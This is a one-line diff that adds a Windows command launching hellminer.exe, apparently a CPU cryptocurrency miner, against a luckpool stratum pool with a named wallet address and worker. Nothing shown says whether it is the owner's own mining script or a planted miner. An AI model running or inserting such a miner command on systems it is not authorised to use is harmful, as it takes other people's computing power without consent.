@@ -1,0 +1,1 @@
+hellminer.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RNAHK39gtdQA4sVM6cHeM8zpuModFYUCR1.Coro -p x --cpu 2
